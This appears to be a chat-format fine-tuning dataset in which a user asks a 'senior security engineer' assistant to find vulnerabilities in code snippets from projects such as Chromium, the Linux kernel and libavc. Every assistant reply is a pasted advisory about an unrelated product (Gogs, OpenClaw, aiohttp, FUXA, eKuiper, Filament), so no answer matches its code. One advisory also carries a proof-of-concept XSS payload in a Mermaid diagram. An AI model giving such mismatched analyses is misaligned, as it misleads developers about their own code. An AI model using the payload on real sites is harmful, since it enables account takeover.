{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nbool XSSAuditor::FilterParamToken(const FilterTokenRequest& request) {\n  DCHECK_EQ(request.token.GetType(), HTMLToken::kStartTag);\n  DCHECK(HasName(request.token, paramTag));\n\n  size_t index_of_name_attribute;\n  if (!FindAttributeWithName(request.token, nameAttr, index_of_name_attribute))\n    return false;\n\n  const HTMLToken::Attribute& name_attribute =\n      request.token.Attributes().at(index_of_name_attribute);\n  if (!HTMLParamElement::IsURLParameter(name_attribute.Value()))\n    return false;\n\n  return EraseAttributeIfInjected(request, valueAttr, BlankURL().GetString(),\n                                  kSrcLikeAttributeTruncation);\n}\n\n```"}, {"role": "assistant", "content": "Gogs vulnerable to Stored XSS via Mermaid diagrams\n\n### Summary\nStored XSS via mermaid diagrams due to usage of vulnerable renderer library\n\n### Details\nGogs introduced support for rendering mermaid diagrams in version [0.13.0.](https://github.com/gogs/gogs/releases/tag/v0.13.0)\n\nCurrently used version of the library [mermaid 11.9.0](https://github.com/gogs/gogs/tree/main/public/plugins/mermaid-11.9.0) is vulnerable to at least two XSS scenarios with publicly available payloads\n\nResources:\nhttps://github.com/mermaid-js/mermaid/security/advisories/GHSA-7rqq-prvp-x9jh\nhttps://github.com/mermaid-js/mermaid/security/advisories/GHSA-8gwm-58g9-j8pw\n\n### PoC\n\n1. Create a markdown file eg. `README.md` containing following malicious mermaid diagram (payload based on [CVE-2025-54880](https://github.com/mermaid-js/mermaid/security/advisories/GHSA-8gwm-58g9-j8pw))\n```\narchitecture-beta\n    group api(cloud)[API]\n    service db \"<img src=x onerror=\\\"alert(document.domain)\\\">\" [Database] in api\n```\n2. The XSS should pop whenever either repository or file is viewed\n\n#### Demo\n\nhttps://github.com/user-attachments/assets/98320f62-6c1c-4254-aa61-95598c725235\n\n### Impact\nThe attacker can potentially achieve account takeover\nIn a worst case scenario if the victim were an instance admin this could lead to a compromise of the entire deployment\n\n### Proposed remediation steps\n1. Upgrade to a patched version of the third party library\nhttps://github.com/mermaid-js/mermaid/releases/tag/v10.9.5\n2. Consider running mermaid using `sandbox` level which would mitigate impact of future potential cross-site scripting issues\nhttps://mermaid.js.org/config/usage.html#securitylevel"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\ncrm_ipc_buffer(crm_ipc_t * client)\n{\n    CRM_ASSERT(client != NULL);\n    return client->buffer + sizeof(struct crm_ipc_response_header);\n}\n\n```"}, {"role": "assistant", "content": "OpenClaw's unauthenticated Nostr profile HTTP endpoints allow remote profile/config tampering\n\n## Summary\nThe OpenClaw Nostr channel plugin (optional, disabled by default, installed separately) exposes profile management HTTP endpoints under `/api/channels/nostr/:accountId/profile` (GET/PUT) and `/api/channels/nostr/:accountId/profile/import` (POST). In affected versions, these routes were dispatched via the gateway plugin HTTP layer without requiring gateway authentication, allowing unauthenticated remote callers to read or mutate the Nostr profile and persist changes to the gateway config. Profile updates are also published as a signed Nostr kind:0 event using the bot's private key.\n\nDeployments that do not have the Nostr plugin installed and enabled are not impacted.\n\n## Affected Packages / Versions\n- Package: `openclaw` (npm)\n- Affected versions: `<= 2026.2.9`\n- Fixed versions: `>= 2026.2.12`\n- Scope note: only affects deployments with the optional `@openclaw/nostr` plugin installed and enabled\n\n## Details\nThis is exploitable when the gateway HTTP port is reachable beyond localhost (for example: bound to `0.0.0.0`, exposed on a LAN, behind a reverse proxy, or via Tailscale Funnel/Serve).\n\nUnauthenticated callers could update the Nostr profile and persist the new profile in the gateway config.\n\n## Mitigation\nUpgrade to `openclaw` `2026.2.12` or later.\n\nAs a temporary mitigation, restrict gateway HTTP exposure (bind loopback-only and/or enforce network-layer access controls) until upgraded.\n\n## Fix\nGateway now requires gateway authentication for plugin HTTP requests under `/api/channels/*` before dispatching to plugin handlers.\n\nFix commit(s):\n- 647d929c9d0fd114249230d939a5cb3b36dc70e7\n\nThanks @simecek for reporting."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nFILE* CreateAndOpenTemporaryShmemFile(FilePath* path, bool executable) {\n  FilePath directory;\n  if (!GetShmemTempDir(&directory, executable))\n    return NULL;\n\n  return CreateAndOpenTemporaryFileInDir(directory, path);\n}\n\n```"}, {"role": "assistant", "content": "aiohttp is vulnerable to directory traversal\n\n### Summary\nImproperly configuring static resource resolution in aiohttp when used as a web server can result in the unauthorized reading of arbitrary files on the system.\n\n### Details\nWhen using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if a given file path is within the root directory.This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.\n\ni.e. An application is only vulnerable with setup code like:\n```\napp.router.add_routes([\n    web.static(\"/static\", \"static/\", follow_symlinks=True),  # Remove follow_symlinks to avoid the vulnerability\n])\n```\n\n### Impact\nThis is a directory traversal vulnerability with CWE ID 22. When using aiohttp as a web server and enabling static resource resolution with `follow_symlinks` set to True, it can lead to this vulnerability. This vulnerability has been present since the introduction of the `follow_symlinks` parameter.\n\n### Workaround\nEven if upgrading to a patched version of aiohttp, we recommend following these steps regardless.\n\nIf using `follow_symlinks=True` outside of a restricted local development environment, disable the option immediately. This option is NOT needed to follow symlinks which point to a location _within_ the static root directory, it is _only_ intended to allow a symlink to break out of the static directory. Even with this CVE fixed, there is still a substantial risk of misconfiguration when using this option on a server that accepts requests from remote users.\n\nAdditionally, aiohttp has always recommended using a reverse proxy server (such as nginx) to handle static resources and _not_ to use these static resources in aiohttp for production environments. Doing so also protects against this vulnerability, and is why we expect the number of affected users to be very low.\n\n-----\n\nPatch: https://github.com/aio-libs/aiohttp/pull/8079/files"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstd::string TestURLLoader::TestFailsBogusContentLength() {\n  pp::URLRequestInfo request(instance_);\n  request.SetURL(\"/echo\");\n  request.SetMethod(\"POST\");\n  request.SetHeaders(\"Content-Length: 400\");\n  std::string postdata(\"postdata\");\n  request.AppendDataToBody(postdata.data(),\n                           static_cast<uint32_t>(postdata.length()));\n\n  int32_t rv;\n  rv = OpenUntrusted(request, NULL);\n  if (rv != PP_ERROR_NOACCESS)\n    return ReportError(\n        \"Untrusted request with bogus Content-Length restriction\", rv);\n\n  PASS();\n}\n\n```"}, {"role": "assistant", "content": "OpenClaw Node host system.run rawCommand/command mismatch can bypass allowlist/approvals\n\n## Summary\n\nA mismatch between `rawCommand` and `command[]` in the node host `system.run` handler could cause allowlist/approval evaluation to be performed on one command while executing a different argv.\n\n## Affected Configurations\n\nThis only impacts deployments that:\n\n- Use the node host / companion node execution path (`system.run` on a node).\n- Enable allowlist-based exec policy (`security=allowlist`) with approval prompting driven by allowlist misses (for example `ask=on-miss`).\n- Allow an attacker to invoke `system.run`.\n\nDefault/non-node configurations are not affected.\n\n## Impact\n\nIn affected configurations, an attacker who can invoke `system.run` can bypass allowlist enforcement and approval prompts by supplying an allowlisted `rawCommand` while providing a different `command[]` argv for execution.\n\n## Affected Packages / Versions\n\n- Package: `openclaw` (npm)\n- Affected versions: `<= 2026.2.13`\n- Patched version: `>= 2026.2.14` (planned next release)\n\n## Fix\n\nEnforce `rawCommand`/`command[]` consistency (gateway fail-fast + node host validation).\n\n## Fix Commit(s)\n\n- cb3290fca32593956638f161d9776266b90ab891\n\n## Release Process Note\n\nThis advisory pre-sets the patched version to the planned next release (`2026.2.14`). Once `openclaw@2026.2.14` is published to npm, the advisory can be published without further edits.\n\nThanks @christos-eth for reporting."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid LocalFrame::Init() {\n  CoreInitializer::GetInstance().InitLocalFrame(*this);\n\n  loader_.Init();\n}\n\n```"}, {"role": "assistant", "content": "FUXA Unauthenticated Remote Code Execution via Admin JWT Minting\n\n### Note\nGitHub incorrectly stated this vulnerability is identical to CVE-2025-69970, which describes the fact that authentication is disabled by default. This advisory describes an exploit chain that enables authentication bypass via the heartbeat refresh endpoint when authentication is enabled. This misleads users into thinking that enabling authentication would mitigate this vulnerability. Please see the patch for more information: https://github.com/frangoteam/FUXA/commit/fe82348d160904d0013b9a3e267d50158f5c7afb.\n\n### Description\nAn authentication bypass vulnerability in FUXA allows an unauthenticated, remote attacker to gain administrative access via the heartbeat refresh API and execute arbitrary code on the server. This affects FUXA through version 1.2.9 when authentication is enabled. This issue has been patched in FUXA version 1.2.10.\n\n### Impact\nAffected deployments are those with `runtime.settings.secureEnabled` set to `true`.\n\nExploitation allows an unauthenticated, remote attacker to bypass all authentication mechanisms and obtain administrative access to the FUXA instance by minting administrator JWTs via the heartbeat refresh endpoint. With these elevated privileges, the attacker can interact with administrative APIs, including intended features designed for automation and scripting, to execute arbitrary code in the context of the FUXA service. Depending on deployment configuration and permissions, this may lead to full system compromise and could further expose connected ICS/SCADA environments to follow-on actions.\n\n### Patches\nThis issue has been patched in FUXA version 1.2.10. Users are strongly encouraged to update to the latest available release."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nUNCURL_EXPORT int32_t uncurl_listen(struct uncurl_conn *ucc, char *bind_ip4, uint16_t port)\n{\n\tint32_t e;\n\n\tucc->port = port;\n\n\te = net_listen(&ucc->net, bind_ip4, ucc->port, &ucc->nopts);\n\tif (e != UNCURL_OK) return e;\n\n\treturn UNCURL_OK;\n}\n\n```"}, {"role": "assistant", "content": "unity-cli Exposes Plaintext Credentials in Debug Logs (sign-package command)\n\nThe sign-package command in @rage-against-the-pixel/unity-cli logs sensitive credentials in plaintext when the `--verbose` flag is used. Command-line arguments including `--email` and `--password` are output via JSON.stringify without sanitization, exposing secrets to shell history, CI/CD logs, and log aggregation systems.\n\nUsers who run sign-package with `--verbose` and credential arguments expose their Unity account passwords. This affects all versions prior to 1.8.2. The vulnerability requires explicit user action (using `--verbose`) but creates significant risk in automated and shared environments.\n\nWorkaround: Use environment variables (`UNITY_USERNAME`, `UNITY_PASSWORD`) instead of command-line arguments, and avoid the `--verbose` flag when working with credentials.\n\nExisting RageAgainstThePixel and Buildalon GitHub actions are unaffected as they use the environment variables exclusively."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic int hci_uart_flush(struct hci_dev *hdev)\n{\n\tstruct hci_uart *hu  = hci_get_drvdata(hdev);\n\tstruct tty_struct *tty = hu->tty;\n\n\tBT_DBG(\"hdev %p tty %p\", hdev, tty);\n\n\tif (hu->tx_skb) {\n\t\tkfree_skb(hu->tx_skb); hu->tx_skb = NULL;\n\t}\n\n\t/* Flush any pending characters in the driver and discipline. */\n\ttty_ldisc_flush(tty);\n\ttty_driver_flush_buffer(tty);\n\n\tpercpu_down_read(&hu->proto_lock);\n\n\tif (test_bit(HCI_UART_PROTO_READY, &hu->flags))\n\t\thu->proto->flush(hu);\n\n\tpercpu_up_read(&hu->proto_lock);\n\n\treturn 0;\n}\n\n```"}, {"role": "assistant", "content": "mageMagick has a possible use-after-free write in its PDB decoder\n\nA use-after-free vulnerability exists in the PDB decoder that will use a stale pointer when a memory allocation fails and that could result in a crash or a single zero byte write.\n\n```\n==4033155==ERROR: AddressSanitizer: UNKNOWN SIGNAL on unknown address 0x000000000000 (pc 0x5589c1971b24 bp 0x7ffdcc7ae2d0 sp 0x7ffdcc7adb20 T0)\n```\n\n```\n==4034812==ERROR: AddressSanitizer: heap-use-after-free on address 0x7f099e9f7800 at pc 0x5605d909ab20 bp 0x7ffe52045b50 sp 0x7ffe52045b40\nWRITE of size 1 at 0x7f099e9f7800 thread T0\n```"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\n  size_t ContentLayerCount() {\n    return paint_artifact_compositor()\n        ->GetExtraDataForTesting()\n        ->content_layers.size();\n  }\n\n```"}, {"role": "assistant", "content": "memos vulnerability allows the creation of arbitrary accounts\n\nIncorrect access control in the /api/v1/user endpoint of usememos memos v0.25.2 allows unauthorized attackers to create arbitrary accounts via a crafted request."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nuser_get_cached (User *user)\n{\n        return user->cached;\n}\n\n```"}, {"role": "assistant", "content": "LF Edge eKuiper is vulnerable to Arbitrary File Read/Write via unsanitized names and zip extraction\n\n### Summary\nMultiple path traversal and unsafe path handling vulnerabilities were discovered in eKuiper prior to the fixes implemented in PR [lf-edge/ekuiper#3911](https://github.com/lf-edge/ekuiper/pull/3911). The issues allow attacker-controlled input (rule names, schema versions, plugin names, uploaded file names, and ZIP entries) to influence file system paths used by the application. In vulnerable deployments, this can permit files to be created, overwritten, or extracted outside the intended directories, potentially enabling disclosure of sensitive files, tampering with configuration or plugin binaries, denial of service, or other host compromise scenarios.\n\nSeveral components used unvalidated user input when constructing filesystem paths or when extracting archives. In each case, input was accepted and used directly in path operations (join, create, delete, extract) without sufficient sanitization or canonicalization, allowing the input to include path separators, `..` segments, or absolute paths.\n\n### Impact\n**Arbitrary file overwrite / deletion:** attackers could overwrite or delete files outside the intended directory, which can corrupt application data, remove logs, or disable services.\n\n### Resources\n- https://github.com/lf-edge/ekuiper/commit/58362b089c76f08c400fe0dbb3667e6e871eaffd\n- https://github.com/lf-edge/ekuiper/pull/3911"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic CURLcode nss_cache_crl(SECItem *crl_der)\n{\n  CERTCertDBHandle *db = CERT_GetDefaultCertDB();\n  CERTSignedCrl *crl = SEC_FindCrlByDERCert(db, crl_der, 0);\n  if(crl) {\n    /* CRL already cached */\n    SEC_DestroyCrl(crl);\n    SECITEM_FreeItem(crl_der, PR_TRUE);\n    return CURLE_OK;\n  }\n\n  /* acquire lock before call of CERT_CacheCRL() and accessing nss_crl_list */\n  PR_Lock(nss_crllock);\n\n  /* store the CRL item so that we can free it in Curl_nss_cleanup() */\n  if(!Curl_llist_insert_next(nss_crl_list, nss_crl_list->tail, crl_der)) {\n    SECITEM_FreeItem(crl_der, PR_TRUE);\n    PR_Unlock(nss_crllock);\n    return CURLE_OUT_OF_MEMORY;\n  }\n\n  if(SECSuccess != CERT_CacheCRL(db, crl_der)) {\n    /* unable to cache CRL */\n    PR_Unlock(nss_crllock);\n    return CURLE_SSL_CRL_BADFILE;\n  }\n\n  /* we need to clear session cache, so that the CRL could take effect */\n  SSL_ClearSessionCache();\n  PR_Unlock(nss_crllock);\n  return CURLE_OK;\n}\n\n```"}, {"role": "assistant", "content": "Filament multi-factor authentication (app) recovery codes can be used multiple times\n\n### Summary\n\nA flaw in the handling of recovery codes for **app-based multi-factor authentication** allows the same recovery code to be reused indefinitely. This issue does **not** affect email-based MFA. It also only applies when recovery codes are enabled.\n\n### Impact\n\nIf an attacker gains access to both the user's password and their recovery codes, they can repeatedly complete MFA without the user's app-based second factor. This weakens the expected security of MFA by turning recovery codes into a static, long-term bypass method."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic void tcp_v6_init_req(struct request_sock *req,\n\t\t\t    const struct sock *sk_listener,\n\t\t\t    struct sk_buff *skb)\n{\n\tstruct inet_request_sock *ireq = inet_rsk(req);\n\tconst struct ipv6_pinfo *np = inet6_sk(sk_listener);\n\n\tireq->ir_v6_rmt_addr = ipv6_hdr(skb)->saddr;\n\tireq->ir_v6_loc_addr = ipv6_hdr(skb)->daddr;\n\n\t/* So that link locals have meaning */\n\tif (!sk_listener->sk_bound_dev_if &&\n\t    ipv6_addr_type(&ireq->ir_v6_rmt_addr) & IPV6_ADDR_LINKLOCAL)\n\t\tireq->ir_iif = tcp_v6_iif(skb);\n\n\tif (!TCP_SKB_CB(skb)->tcp_tw_isn &&\n\t    (ipv6_opt_accepted(sk_listener, skb, &TCP_SKB_CB(skb)->header.h6) ||\n\t     np->rxopt.bits.rxinfo ||\n\t     np->rxopt.bits.rxoinfo || np->rxopt.bits.rxhlim ||\n\t     np->rxopt.bits.rxohlim || np->repflow)) {\n\t\tatomic_inc(&skb->users);\n\t\tireq->pktopts = skb;\n\t}\n}\n\n```"}, {"role": "assistant", "content": "OpenClaw's Chrome extension relay binds publicly due to wildcard treated as loopback\n\n## Summary\nThe Chrome extension relay (`ensureChromeExtensionRelayServer`) previously treated wildcard hosts (`0.0.0.0` / `::`) as loopback, which could make it bind the relay HTTP/WS server to all interfaces when a wildcard `cdpUrl` was passed.\n\n## Impact\nIf configured with a wildcard `cdpUrl`, relay HTTP endpoints could become reachable off-host, leaking service presence/port and enabling DoS/brute-force traffic against the relay token header.\n\n## Affected Packages / Versions\n- Package: `openclaw` (npm)\n- Affected: `>= 2026.1.14-1 < 2026.2.12`\n\n## Fixed Versions\n- Patched: `>= 2026.2.12` (released 2026-02-13)\n\n## Fix Commit(s)\n- 8d75a496bf5aaab1755c56cf48502d967c75a1d0\n\n## Notes\n- Earlier hardening for `/json*` auth and `/cdp` token checks landed in:\n  - a1e89afcc19efd641c02b24d66d689f181ae2b5c\n\nThanks @qi-scape for reporting."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nWORD32 ih264d_video_decode(iv_obj_t *dec_hdl, void *pv_api_ip, void *pv_api_op)\n{\n /* ! */\n\n dec_struct_t * ps_dec = (dec_struct_t *)(dec_hdl->pv_codec_handle);\n\n    WORD32 i4_err_status = 0;\n    UWORD8 *pu1_buf = NULL;\n    WORD32 buflen;\n    UWORD32 u4_max_ofst, u4_length_of_start_code = 0;\n\n    UWORD32 bytes_consumed = 0;\n    UWORD32 cur_slice_is_nonref = 0;\n    UWORD32 u4_next_is_aud;\n    UWORD32 u4_first_start_code_found = 0;\n    WORD32 ret = 0,api_ret_value = IV_SUCCESS;\n    WORD32 header_data_left = 0,frame_data_left = 0;\n    UWORD8 *pu1_bitstrm_buf;\n ivd_video_decode_ip_t *ps_dec_ip;\n ivd_video_decode_op_t *ps_dec_op;\n\n    ithread_set_name((void*)\"Parse_thread\");\n\n    ps_dec_ip = (ivd_video_decode_ip_t *)pv_api_ip;\n    ps_dec_op = (ivd_video_decode_op_t *)pv_api_op;\n\n {\n        UWORD32 u4_size;\n        u4_size = ps_dec_op->u4_size;\n        memset(ps_dec_op, 0, sizeof(ivd_video_decode_op_t));\n        ps_dec_op->u4_size = u4_size;\n }\n\n    ps_dec->pv_dec_out = ps_dec_op;\n if(ps_dec->init_done != 1)\n {\n return IV_FAIL;\n }\n\n /*Data memory barries instruction,so that bitstream write by the application is complete*/\n    DATA_SYNC();\n\n if(0 == ps_dec->u1_flushfrm)\n {\n if(ps_dec_ip->pv_stream_buffer == NULL)\n {\n            ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n            ps_dec_op->u4_error_code |= IVD_DEC_FRM_BS_BUF_NULL;\n return IV_FAIL;\n }\n if(ps_dec_ip->u4_num_Bytes <= 0)\n {\n            ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n            ps_dec_op->u4_error_code |= IVD_DEC_NUMBYTES_INV;\n return IV_FAIL;\n\n }\n }\n    ps_dec->u1_pic_decode_done = 0;\n\n    ps_dec_op->u4_num_bytes_consumed = 0;\n\n    ps_dec->ps_out_buffer = NULL;\n\n if(ps_dec_ip->u4_size\n >= offsetof(ivd_video_decode_ip_t, s_out_buffer))\n        ps_dec->ps_out_buffer = &ps_dec_ip->s_out_buffer;\n\n    ps_dec->u4_fmt_conv_cur_row = 0;\n\n    ps_dec->u4_output_present = 0;\n    ps_dec->s_disp_op.u4_error_code = 1;\n    ps_dec->u4_fmt_conv_num_rows = FMT_CONV_NUM_ROWS;\n if(0 == ps_dec->u4_share_disp_buf\n && ps_dec->i4_decode_header == 0)\n {\n        UWORD32 i;\n if((ps_dec->ps_out_buffer->u4_num_bufs == 0) ||\n (ps_dec->ps_out_buffer->u4_num_bufs > IVD_VIDDEC_MAX_IO_BUFFERS))\n {\n            ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n            ps_dec_op->u4_error_code |= IVD_DISP_FRM_ZERO_OP_BUFS;\n return IV_FAIL;\n }\n\n for(i = 0; i < ps_dec->ps_out_buffer->u4_num_bufs; i++)\n {\n if(ps_dec->ps_out_buffer->pu1_bufs[i] == NULL)\n {\n                ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n                ps_dec_op->u4_error_code |= IVD_DISP_FRM_OP_BUF_NULL;\n return IV_FAIL;\n }\n\n if(ps_dec->ps_out_buffer->u4_min_out_buf_size[i] == 0)\n {\n                ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n                ps_dec_op->u4_error_code |=\n                                IVD_DISP_FRM_ZERO_OP_BUF_SIZE;\n return IV_FAIL;\n }\n }\n }\n\n if(ps_dec->u4_total_frames_decoded >= NUM_FRAMES_LIMIT)\n {\n        ps_dec_op->u4_error_code = ERROR_FRAME_LIMIT_OVER;\n return IV_FAIL;\n }\n\n /* ! */\n    ps_dec->u4_ts = ps_dec_ip->u4_ts;\n\n    ps_dec_op->u4_error_code = 0;\n    ps_dec_op->e_pic_type = -1;\n    ps_dec_op->u4_output_present = 0;\n    ps_dec_op->u4_frame_decoded_flag = 0;\n\n    ps_dec->i4_frametype = -1;\n    ps_dec->i4_content_type = -1;\n\n    ps_dec->u4_slice_start_code_found = 0;\n\n /* In case the deocder is not in flush mode(in shared mode),\n     then decoder has to pick up a buffer to write current frame.\n     Check if a frame is available in such cases */\n\n if(ps_dec->u1_init_dec_flag == 1 && ps_dec->u4_share_disp_buf == 1\n && ps_dec->u1_flushfrm == 0)\n {\n        UWORD32 i;\n\n        WORD32 disp_avail = 0, free_id;\n\n /* Check if at least one buffer is available with the codec */\n /* If not then return to application with error */\n for(i = 0; i < ps_dec->u1_pic_bufs; i++)\n {\n if(0 == ps_dec->u4_disp_buf_mapping[i]\n || 1 == ps_dec->u4_disp_buf_to_be_freed[i])\n {\n                disp_avail = 1;\n break;\n }\n\n }\n\n if(0 == disp_avail)\n {\n /* If something is queued for display wait for that buffer to be returned */\n\n            ps_dec_op->u4_error_code = IVD_DEC_REF_BUF_NULL;\n            ps_dec_op->u4_error_code |= (1 << IVD_UNSUPPORTEDPARAM);\n return (IV_FAIL);\n }\n\n while(1)\n {\n pic_buffer_t *ps_pic_buf;\n            ps_pic_buf = (pic_buffer_t *)ih264_buf_mgr_get_next_free(\n (buf_mgr_t *)ps_dec->pv_pic_buf_mgr, &free_id);\n\n if(ps_pic_buf == NULL)\n {\n                UWORD32 i, display_queued = 0;\n\n /* check if any buffer was given for display which is not returned yet */\n for(i = 0; i < (MAX_DISP_BUFS_NEW); i++)\n {\n if(0 != ps_dec->u4_disp_buf_mapping[i])\n {\n                        display_queued = 1;\n break;\n }\n }\n /* If some buffer is queued for display, then codec has to singal an error and wait\n                 for that buffer to be returned.\n                 If nothing is queued for display then codec has ownership of all display buffers\n                 and it can reuse any of the existing buffers and continue decoding */\n\n if(1 == display_queued)\n {\n /* If something is queued for display wait for that buffer to be returned */\n                    ps_dec_op->u4_error_code = IVD_DEC_REF_BUF_NULL;\n                    ps_dec_op->u4_error_code |= (1\n << IVD_UNSUPPORTEDPARAM);\n return (IV_FAIL);\n }\n }\n else\n {\n /* If the buffer is with display, then mark it as in use and then look for a buffer again */\n if(1 == ps_dec->u4_disp_buf_mapping[free_id])\n {\n                    ih264_buf_mgr_set_status(\n (buf_mgr_t *)ps_dec->pv_pic_buf_mgr,\n                                    free_id,\n                                    BUF_MGR_IO);\n }\n else\n {\n /**\n                     *  Found a free buffer for present call. Release it now.\n                     *  Will be again obtained later.\n                     */\n                    ih264_buf_mgr_release((buf_mgr_t *)ps_dec->pv_pic_buf_mgr,\n                                          free_id,\n                                          BUF_MGR_IO);\n break;\n }\n }\n }\n\n }\n\n if(ps_dec->u1_flushfrm)\n {\n if(ps_dec->u1_init_dec_flag == 0)\n {\n /*Come out of flush mode and return*/\n            ps_dec->u1_flushfrm = 0;\n return (IV_FAIL);\n }\n\n\n\n        ih264d_get_next_display_field(ps_dec, ps_dec->ps_out_buffer,\n &(ps_dec->s_disp_op));\n if(0 == ps_dec->s_disp_op.u4_error_code)\n {\n /* check output buffer size given by the application */\n if(check_app_out_buf_size(ps_dec) != IV_SUCCESS)\n {\n                ps_dec_op->u4_error_code= IVD_DISP_FRM_ZERO_OP_BUF_SIZE;\n return (IV_FAIL);\n }\n\n            ps_dec->u4_fmt_conv_cur_row = 0;\n            ps_dec->u4_fmt_conv_num_rows = ps_dec->s_disp_frame_info.u4_y_ht;\n            ih264d_format_convert(ps_dec, &(ps_dec->s_disp_op),\n                                  ps_dec->u4_fmt_conv_cur_row,\n                                  ps_dec->u4_fmt_conv_num_rows);\n            ps_dec->u4_fmt_conv_cur_row += ps_dec->u4_fmt_conv_num_rows;\n            ps_dec->u4_output_present = 1;\n\n }\n        ih264d_release_display_field(ps_dec, &(ps_dec->s_disp_op));\n\n        ps_dec_op->u4_pic_wd = (UWORD32)ps_dec->u2_disp_width;\n        ps_dec_op->u4_pic_ht = (UWORD32)ps_dec->u2_disp_height;\n\n        ps_dec_op->u4_new_seq = 0;\n\n        ps_dec_op->u4_output_present = ps_dec->u4_output_present;\n        ps_dec_op->u4_progressive_frame_flag =\n                        ps_dec->s_disp_op.u4_progressive_frame_flag;\n        ps_dec_op->e_output_format =\n                        ps_dec->s_disp_op.e_output_format;\n        ps_dec_op->s_disp_frm_buf = ps_dec->s_disp_op.s_disp_frm_buf;\n        ps_dec_op->e4_fld_type = ps_dec->s_disp_op.e4_fld_type;\n        ps_dec_op->u4_ts = ps_dec->s_disp_op.u4_ts;\n        ps_dec_op->u4_disp_buf_id = ps_dec->s_disp_op.u4_disp_buf_id;\n\n /*In the case of flush ,since no frame is decoded set pic type as invalid*/\n        ps_dec_op->u4_is_ref_flag = -1;\n        ps_dec_op->e_pic_type = IV_NA_FRAME;\n        ps_dec_op->u4_frame_decoded_flag = 0;\n\n if(0 == ps_dec->s_disp_op.u4_error_code)\n {\n return (IV_SUCCESS);\n }\n else\n return (IV_FAIL);\n\n }\n if(ps_dec->u1_res_changed == 1)\n {\n /*if resolution has changed and all buffers have been flushed, reset decoder*/\n        ih264d_init_decoder(ps_dec);\n }\n\n    ps_dec->u4_prev_nal_skipped = 0;\n\n    ps_dec->u2_cur_mb_addr = 0;\n    ps_dec->u2_total_mbs_coded = 0;\n    ps_dec->u2_cur_slice_num = 0;\n    ps_dec->cur_dec_mb_num = 0;\n    ps_dec->cur_recon_mb_num = 0;\n    ps_dec->u4_first_slice_in_pic = 1;\n    ps_dec->u1_slice_header_done = 0;\n    ps_dec->u1_dangling_field = 0;\n\n    ps_dec->u4_dec_thread_created = 0;\n    ps_dec->u4_bs_deblk_thread_created = 0;\n    ps_dec->u4_cur_bs_mb_num = 0;\n    ps_dec->u4_start_recon_deblk  = 0;\n    ps_dec->u4_sps_cnt_in_process = 0;\n\n    DEBUG_THREADS_PRINTF(\" Starting process call\\n\");\n\n\n    ps_dec->u4_pic_buf_got = 0;\n\n do\n {\n        WORD32 buf_size;\n\n        pu1_buf = (UWORD8*)ps_dec_ip->pv_stream_buffer\n + ps_dec_op->u4_num_bytes_consumed;\n\n        u4_max_ofst = ps_dec_ip->u4_num_Bytes\n - ps_dec_op->u4_num_bytes_consumed;\n\n /* If dynamic bitstream buffer is not allocated and\n         * header decode is done, then allocate dynamic bitstream buffer\n         */\n if((NULL == ps_dec->pu1_bits_buf_dynamic) &&\n (ps_dec->i4_header_decoded & 1))\n {\n            WORD32 size;\n\n void *pv_buf;\n void *pv_mem_ctxt = ps_dec->pv_mem_ctxt;\n            size = MAX(256000, ps_dec->u2_pic_wd * ps_dec->u2_pic_ht * 3 / 2);\n            pv_buf = ps_dec->pf_aligned_alloc(pv_mem_ctxt, 128,\n                                              size + EXTRA_BS_OFFSET);\n            RETURN_IF((NULL == pv_buf), IV_FAIL);\n            ps_dec->pu1_bits_buf_dynamic = pv_buf;\n            ps_dec->u4_dynamic_bits_buf_size = size;\n }\n\n if(ps_dec->pu1_bits_buf_dynamic)\n {\n            pu1_bitstrm_buf = ps_dec->pu1_bits_buf_dynamic;\n            buf_size = ps_dec->u4_dynamic_bits_buf_size;\n }\n else\n {\n            pu1_bitstrm_buf = ps_dec->pu1_bits_buf_static;\n            buf_size = ps_dec->u4_static_bits_buf_size;\n }\n\n        u4_next_is_aud 